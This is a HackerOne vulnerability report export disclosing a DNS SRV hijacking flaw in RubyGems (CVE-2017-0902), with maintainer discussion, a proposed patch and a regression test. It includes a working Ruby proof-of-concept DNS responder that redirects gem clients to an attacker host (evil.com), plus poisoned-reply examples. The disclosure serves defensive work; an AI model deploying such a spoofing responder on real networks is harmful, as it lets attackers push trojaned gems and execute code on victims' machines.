{"id":218088,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTgwODg=","url":"https://hackerone.com/reports/218088","title":"Request Hijacking Vulnerability in RubyGems 2.6.11 and earlier","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2017-04-02T17:31:05.933Z","submitted_at":"2017-04-02T17:31:05.933Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"claudijd","url":"/claudijd","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8212,"url":"https://hackerone.com/rubygems","handle":"rubygems","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"RubyGems","twitter_handle":"rubygems_status","website":"https://rubygems.org","about":"RubyGems.org is the Ruby communityâ€™s gem hosting service."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2017-0902"],"singular_disclosure_disabled":false,"disclosed_at":"2017-08-30T23:36:42.991Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2017-08-28T16:41:24.208Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Description:**\n\nThe RubyGems client supports a gem server API discovery functionality,\nwhich is used when pushing or pulling gems to a gem distribution/hosting\nserver, like RubyGems.org.  This functionality is provided via a SRV DNS\nrequest to the users gem source hostname prepended with \"_rubygems._tcp.\".\nThe response to this request tells the RubyGems client (aka: the gem\ncommand) where the users gem server API is.  In the default RubyGems\nscenario, with a gem source of https://rubygems.org, the users SRV DNS\nrequest and reply will look like this:\n\n    ~ $ dig srv _rubygems._tcp.rubygems.org +short\n    0 1 80 api.rubygems.org.\n\nDue to a deficiency in DNS response verification, a MiTM positioned \nattacker can poison the DNS response to this record response and force\nthe client to unknowingly download and install Ruby gems from an attacker\ncontrolled gem server in an alternate security domain.  An example of\nsuch a scenario would look like so:\n\n    ~ $ dig _rubygems._tcp.rubygems.org SRV +short\n    0 0 53 evil.com/api.rubygems.com.\n\nIn such a scenario, the attacker is able to serve the client malicious gem\ncontent, resulting in trivial remote code execution scenarios.  For\nexample, the attacker could simply modify the gem source code and trigger\ncode execution via the extensions API at install time on the client machine\n(a gem trojaning technique described by Ben Smith in his \"Hacking with\nGems\" presentation at Aloha Ruby Conference in 2012 -\nhttps://www.youtube.com/watch?v=z-5bO0Q1J9s)/\n\nThis vulnerability has the same net effect/impact as [CVE-2015-3900](https://nvd.nist.gov/vuln/detail/CVE-2015-3900) and\n[CVE-2015-4020](https://nvd.nist.gov/vuln/detail/CVE-2015-4020).\n\n**Affected method in Gem::RemoteFetcher:**\n\nhttps://github.com/rubygems/rubygems/blob/5096fa35c1ca3e0a7d175aaf9d77cd93114fd977/lib/rubygems/remote_fetcher.rb#L101-L119\n\n**PoC DNS SRV Responder:**\n\n    #!/usr/bin/env ruby\n    require 'rubydns'\n    require 'rubydns/system'\n    INTERFACES = [\n    \t[:udp, \"0.0.0.0\", 53],\n    \t[:tcp, \"0.0.0.0\", 53]\n    ]\n    Name = Resolv::DNS::Name\n    IN = Resolv::DNS::Resource::IN\t\n    RubyDNS::run_server(:listen =\u003e INTERFACES) do\n      match(//, IN::SRV) do |transaction|\n        transaction.respond!(0,0,53,\"evil.com/api.rubygems.com\")\n      end\n    end\n\n**Recommendations:**\n\nConsider this small patch to address the immediate attack vector...\n\n    -      if /\\.#{Regexp.quote(host)}\\z/ =~ target\n    +      if (/\\.#{Regexp.quote(host)}\\z/ =~ target) \u0026\u0026 !target.include?(\"/\")\n\nAlso, consider moving away from doing API discovery via DNS.  Would recommend \nmoving to HTTPS, where you will have a stronger transport security chain.\n\n**References (these are not new, just references prior work here to help triage team understand impact):**\n\n- https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-007/?fid=6356\n- https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-009/?fid=6478\n- https://speakerdeck.com/claudijd/trojaned-gems-you-cant-tell-youre-using-one\n- http://blog.rubygems.org/2015/05/14/CVE-2015-3900.html","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eThe RubyGems client supports a gem server API discovery functionality,\u003cbr\u003e\nwhich is used when pushing or pulling gems to a gem distribution/hosting\u003cbr\u003e\nserver, like RubyGems.org.  This functionality is provided via a SRV DNS\u003cbr\u003e\nrequest to the users gem source hostname prepended with \u0026quot;_rubygems._tcp.\u0026quot;.\u003cbr\u003e\nThe response to this request tells the RubyGems client (aka: the gem\u003cbr\u003e\ncommand) where the users gem server API is.  In the default RubyGems\u003cbr\u003e\nscenario, with a gem source of \u003ca title=\"https://rubygems.org\" href=\"/redirect?url=https%3A%2F%2Frubygems.org\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://rubygems.org\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, the users SRV DNS\u003cbr\u003e\nrequest and reply will look like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e~ $ dig srv _rubygems._tcp.rubygems.org +short\n0 1 80 api.rubygems.org.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eDue to a deficiency in DNS response verification, a MiTM positioned \u003cbr\u003e\nattacker can poison the DNS response to this record response and force\u003cbr\u003e\nthe client to unknowingly download and install Ruby gems from an attacker\u003cbr\u003e\ncontrolled gem server in an alternate security domain.  An example of\u003cbr\u003e\nsuch a scenario would look like so:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e~ $ dig _rubygems._tcp.rubygems.org SRV +short\n0 0 53 evil.com/api.rubygems.com.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIn such a scenario, the attacker is able to serve the client malicious gem\u003cbr\u003e\ncontent, resulting in trivial remote code execution scenarios.  For\u003cbr\u003e\nexample, the attacker could simply modify the gem source code and trigger\u003cbr\u003e\ncode execution via the extensions API at install time on the client machine\u003cbr\u003e\n(a gem trojaning technique described by Ben Smith in his \u0026quot;Hacking with\u003cbr\u003e\nGems\u0026quot; presentation at Aloha Ruby Conference in 2012 -\u003cbr\u003e\n\u003ca title=\"https://www.youtube.com/watch?v=z-5bO0Q1J9s)/\" href=\"/redirect?url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3Dz-5bO0Q1J9s%29%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.youtube.com/watch?v=z-5bO0Q1J9s)/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThis vulnerability has the same net effect/impact as \u003ca href=\"/redirect?url=https%3A%2F%2Fnvd.nist.gov%2Fvuln%2Fdetail%2FCVE-2015-3900\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eCVE-2015-3900\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and\u003cbr\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fnvd.nist.gov%2Fvuln%2Fdetail%2FCVE-2015-4020\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eCVE-2015-4020\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eAffected method in Gem::RemoteFetcher:\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://github.com/rubygems/rubygems/blob/5096fa35c1ca3e0a7d175aaf9d77cd93114fd977/lib/rubygems/remote_fetcher.rb#L101-L119\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frubygems%2Frubygems%2Fblob%2F5096fa35c1ca3e0a7d175aaf9d77cd93114fd977%2Flib%2Frubygems%2Fremote_fetcher.rb%23L101-L119\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/rubygems/rubygems/blob/5096fa35c1ca3e0a7d175aaf9d77cd93114fd977/lib/rubygems/remote_fetcher.rb#L101-L119\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003ePoC DNS SRV Responder:\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e#!/usr/bin/env ruby\u003c/span\u003e\n\u003cspan class=\"nb\"\u003erequire\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;rubydns\u0026#39;\u003c/span\u003e\n\u003cspan class=\"nb\"\u003erequire\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;rubydns/system\u0026#39;\u003c/span\u003e\n\u003cspan class=\"no\"\u003eINTERFACES\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"ss\"\u003e:udp\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;0.0.0.0\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e53\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"ss\"\u003e:tcp\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;0.0.0.0\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e53\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003cspan class=\"no\"\u003eName\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eResolv\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eDNS\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eName\u003c/span\u003e\n\u003cspan class=\"no\"\u003eIN\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eResolv\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eDNS\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eResource\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eIN\u003c/span\u003e  \n\u003cspan class=\"no\"\u003eRubyDNS\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"n\"\u003erun_server\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"ss\"\u003e:listen\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"no\"\u003eINTERFACES\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e\n  \u003cspan class=\"n\"\u003ematch\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sr\"\u003e//\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"no\"\u003eIN\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eSRV\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"n\"\u003etransaction\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\n    \u003cspan class=\"n\"\u003etransaction\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003erespond!\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e53\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;evil.com/api.rubygems.com\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eRecommendations:\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eConsider this small patch to address the immediate attack vector...\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e-      if /\\.#{Regexp.quote(host)}\\z/ =~ target\n+      if (/\\.#{Regexp.quote(host)}\\z/ =~ target) \u0026amp;\u0026amp; !target.include?(\u0026quot;/\u0026quot;)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAlso, consider moving away from doing API discovery via DNS.  Would recommend \u003cbr\u003e\nmoving to HTTPS, where you will have a stronger transport security chain.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eReferences (these are not new, just references prior work here to help triage team understand impact):\u003c/strong\u003e\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca title=\"https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-007/?fid=6356\" href=\"/redirect?url=https%3A%2F%2Fwww.trustwave.com%2FResources%2FSecurity-Advisories%2FAdvisories%2FTWSL2015-007%2F%3Ffid%3D6356\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-007/?fid=6356\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-009/?fid=6478\" href=\"/redirect?url=https%3A%2F%2Fwww.trustwave.com%2FResources%2FSecurity-Advisories%2FAdvisories%2FTWSL2015-009%2F%3Ffid%3D6478\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-009/?fid=6478\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"https://speakerdeck.com/claudijd/trojaned-gems-you-cant-tell-youre-using-one\" href=\"/redirect?url=https%3A%2F%2Fspeakerdeck.com%2Fclaudijd%2Ftrojaned-gems-you-cant-tell-youre-using-one\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://speakerdeck.com/claudijd/trojaned-gems-you-cant-tell-youre-using-one\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"http://blog.rubygems.org/2015/05/14/CVE-2015-3900.html\" href=\"/redirect?url=http%3A%2F%2Fblog.rubygems.org%2F2015%2F05%2F14%2FCVE-2015-3900.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://blog.rubygems.org/2015/05/14/CVE-2015-3900.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-09-27T16:41:24.243Z","allow_singular_disclosure_after":-102687465.08718187,"singular_disclosure_allowed":true,"vote_count":10,"voters":["sp1d3rs","jobert","ysx","claudijd","eveeez","geeknik","r3y","marwan","corycomplex","sonalkr132"],"severity":{"rating":"high","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1579173,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for submitting this report to RubyGems. Our team will review and investigate the issue. Please note that only issues in the rubygems library are eligible for our bug bounty program.","markdown_message":"\u003cp\u003eThanks for submitting this report to RubyGems. Our team will review and investigate the issue. Please note that only issues in the rubygems library are eligible for our bug bounty program.\u003c/p\u003e\n","automated_response":true,"created_at":"2017-04-02T17:31:06.102Z","updated_at":"2017-04-02T17:31:06.102Z","actor":{"url":"/rubygems","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"RubyGems"}},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1603236,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Any update on this issue?","markdown_message":"\u003cp\u003eAny update on this issue?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-10T19:05:04.416Z","updated_at":"2017-04-10T19:05:04.416Z","actor":{"username":"claudijd","cleared":false,"url":"/claudijd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1603274,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Also, regarding recommendations, you may also consider defining a white-list of acceptable characters that fit just hostnames (this would eliminate other possible evasion techniques, like ? or #).  This would be preferred over simply black-listing \"/\" as I suggested above.","markdown_message":"\u003cp\u003eAlso, regarding recommendations, you may also consider defining a white-list of acceptable characters that fit just hostnames (this would eliminate other possible evasion techniques, like ? or #).  This would be preferred over simply black-listing \u0026quot;/\u0026quot; as I suggested above.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-10T19:16:24.562Z","updated_at":"2017-04-10T19:16:49.969Z","actor":{"username":"claudijd","cleared":false,"url":"/claudijd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1603300,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I guess we could also parse the target as a URI and check if its host end with the given host?","markdown_message":"\u003cp\u003eI guess we could also parse the target as a URI and check if its host end with the given host?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-10T19:26:11.750Z","updated_at":"2017-04-10T19:26:11.750Z","actor":{"username":"segiddins","cleared":false,"url":"/segiddins","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1603360,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@segiddins target in this context should be a hostname and not a URI.  If you parse with URI without specifying a scheme, I think host/hostname will be nil...\n\n    2.2.3 :012 \u003e target\n     =\u003e \"evil.com/api.rubygems.org\" \n    2.2.3 :013 \u003e uri = URI(target).host\n     =\u003e nil \n    2.2.3 :014 \u003e uri = URI(target).hostname\n     =\u003e nil \n    2.2.3 :015 \u003e uri = URI(\"https://\" + target).hostname\n     =\u003e \"evil.com\"\n\nBut, in essence, I think that would solve the issue on faking out the host regex.\n\n\n","markdown_message":"\u003cp\u003e\u003ca href=\"/segiddins\"\u003e@segiddins\u003c/a\u003e target in this context should be a hostname and not a URI.  If you parse with URI without specifying a scheme, I think host/hostname will be nil...\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e2.2.3 :012 \u0026gt; target\n =\u0026gt; \u0026quot;evil.com/api.rubygems.org\u0026quot; \n2.2.3 :013 \u0026gt; uri = URI(target).host\n =\u0026gt; nil \n2.2.3 :014 \u0026gt; uri = URI(target).hostname\n =\u0026gt; nil \n2.2.3 :015 \u0026gt; uri = URI(\u0026quot;https://\u0026quot; + target).hostname\n =\u0026gt; \u0026quot;evil.com\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBut, in essence, I think that would solve the issue on faking out the host regex.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-10T19:45:09.225Z","updated_at":"2017-04-10T19:47:30.590Z","actor":{"username":"claudijd","cleared":false,"url":"/claudijd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1603381,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here's a couple other use cases I could think of to test out the URI parsing strategy...\n\n    2.2.3 :020 \u003e URI(\"https://\" + \"evil.com/api.rubygems.org\").hostname\n     =\u003e \"evil.com\" \n    2.2.3 :021 \u003e URI(\"https://\" + \"evil.com?api.rubygems.org\").hostname\n     =\u003e \"evil.com\" \n    2.2.3 :022 \u003e URI(\"https://\" + \"evil.com#api.rubygems.org\").hostname\n     =\u003e \"evil.com\"\n\nThey all look good to me.","markdown_message":"\u003cp\u003eHere\u0026#39;s a couple other use cases I could think of to test out the URI parsing strategy...\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e2.2.3 :020 \u0026gt; URI(\u0026quot;https://\u0026quot; + \u0026quot;evil.com/api.rubygems.org\u0026quot;).hostname\n =\u0026gt; \u0026quot;evil.com\u0026quot; \n2.2.3 :021 \u0026gt; URI(\u0026quot;https://\u0026quot; + \u0026quot;evil.com?api.rubygems.org\u0026quot;).hostname\n =\u0026gt; \u0026quot;evil.com\u0026quot; \n2.2.3 :022 \u0026gt; URI(\u0026quot;https://\u0026quot; + \u0026quot;evil.com#api.rubygems.org\u0026quot;).hostname\n =\u0026gt; \u0026quot;evil.com\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThey all look good to me.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-10T19:52:34.665Z","updated_at":"2017-04-10T19:52:47.518Z","actor":{"username":"claudijd","cleared":false,"url":"/claudijd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1631625,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It's been about 3 weeks since the initial report.  Is there a sense for when a fixed release for this might be able to the public?","markdown_message":"\u003cp\u003eIt\u0026#39;s been about 3 weeks since the initial report.  Is there a sense for when a fixed release for this might be able to the public?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-24T18:21:34.641Z","updated_at":"2017-04-24T18:21:34.641Z","actor":{"username":"claudijd","cleared":false,"url":"/claudijd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1646785,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Whenever someone makes the fix? I'll try and do this if no one beats me to it...","markdown_message":"\u003cp\u003eWhenever someone makes the fix? I\u0026#39;ll try and do this if no one beats me to it...\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-01T17:14:37.417Z","updated_at":"2017-05-01T17:14:58.497Z","actor":{"username":"segiddins","cleared":false,"url":"/segiddins","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1646793,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"If this is sufficient...\n\n```diff\ndiff --git a/lib/rubygems/remote_fetcher.rb b/lib/rubygems/remote_fetcher.rb\nindex e6a13d4b..249d7104 100644\n--- a/lib/rubygems/remote_fetcher.rb\n+++ b/lib/rubygems/remote_fetcher.rb\n@@ -110,7 +110,7 @@ class Gem::RemoteFetcher\n     else\n       target = res.target.to_s.strip\n \n-      if /\\.#{Regexp.quote(host)}\\z/ =~ target\n+      if URI(\"http://\" + target).hostname.end_with?(\".#{host}\")\n         return URI.parse \"#{uri.scheme}://#{target}#{uri.path}\"\n       end\n \ndiff --git a/test/rubygems/test_gem_remote_fetcher.rb b/test/rubygems/test_gem_remote_fetcher.rb\nindex cb994462..fbb7d890 100644\n--- a/test/rubygems/test_gem_remote_fetcher.rb\n+++ b/test/rubygems/test_gem_remote_fetcher.rb\n@@ -241,6 +241,21 @@ PeIQQkFng2VVot/WAQbv3ePqWq07g1BBcwIBAg==\n     dns.verify\n   end\n \n+  def test_api_endpoint_ignores_trans_domain_values_that_end_with_original_in_path\n+    uri = URI.parse \"http://example.com/foo\"\n+    target = MiniTest::Mock.new\n+    target.expect :target, \"evil.com/a.example.com\"\n+\n+    dns = MiniTest::Mock.new\n+    dns.expect :getresource, target, [String, Object]\n+\n+    fetch = Gem::RemoteFetcher.new nil, dns\n+    assert_equal URI.parse(\"http://example.com/foo\"), fetch.api_endpoint(uri)\n+\n+    target.verify\n+    dns.verify\n+  end\n+\n   def test_api_endpoint_timeout_warning\n     uri = URI.parse \"http://gems.example.com/foo\"\n \n\n```","markdown_message":"\u003cp\u003eIf this is sufficient...\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff --git a/lib/rubygems/remote_fetcher.rb b/lib/rubygems/remote_fetcher.rb\nindex e6a13d4b..249d7104 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/lib/rubygems/remote_fetcher.rb\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/lib/rubygems/remote_fetcher.rb\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -110,7 +110,7 @@\u003c/span\u003e class Gem::RemoteFetcher\n     else\n       target = res.target.to_s.strip\n\n-      if /\\.#{Regexp.quote(host)}\\z/ =~ target\n\u003cspan class=\"gi\"\u003e+      if URI(\u0026quot;http://\u0026quot; + target).hostname.end_with?(\u0026quot;.#{host}\u0026quot;)\n\u003c/span\u003e         return URI.parse \u0026quot;#{uri.scheme}://#{target}#{uri.path}\u0026quot;\n       end\n\ndiff --git a/test/rubygems/test_gem_remote_fetcher.rb b/test/rubygems/test_gem_remote_fetcher.rb\n\u003cspan class=\"gh\"\u003eindex cb994462..fbb7d890 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- 